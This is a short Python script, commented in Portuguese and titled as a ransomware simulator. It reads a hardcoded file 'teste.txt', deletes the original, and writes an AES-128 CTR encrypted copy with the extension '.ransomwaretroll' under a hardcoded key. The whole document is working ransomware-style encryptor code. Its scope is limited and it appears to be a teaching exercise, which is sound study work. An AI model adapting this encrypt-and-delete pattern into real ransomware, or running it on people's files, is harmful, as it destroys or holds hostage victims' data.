import os
import pyaes


def clear_screen():
    """Limpa o console do terminal de acordo com o sistema operacional."""
    os.system("cls" if os.name == "nt" else "clear")


def show_header():
    """Exibe um cabeçalho centralizado com informações do programa."""
    clear_screen()
    width = 65
    print("=" * width)
    print("ENCRYPTER - SIMULADOR DE RANSOMWARE".center(width))
    print("=" * width)
    print("Resumo: Criptografa o arquivo alvo usando AES-128 (Modo CTR)".center(width))
    print("e adiciona a extensão '.ransomwaretroll'.".center(width))
    print("=" * width)
    print()


show_header()

file_name = "teste.txt"

print(f"[*] Localizando o arquivo: {file_name}...")
if not os.path.exists(file_name):
    print(f"[!] Erro: Arquivo '{file_name}' não encontrado no diretório.")
    exit()

# Abrir e ler o arquivo original
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)
print(f"[-] Arquivo original '{file_name}' removido.")

# Chave de criptografia simétrica de exatamente 16 bytes (128 bits)
key = b"msantos2026santo"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar os dados
print("[*] Criptografando os dados com AES modo CTR...")
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"
with open(new_file_name, "wb") as new_file:
    new_file.write(crypto_data)

print(f"[+] Sucesso! Arquivo criptografado gerado: {new_file_name}")
print()
print()
print()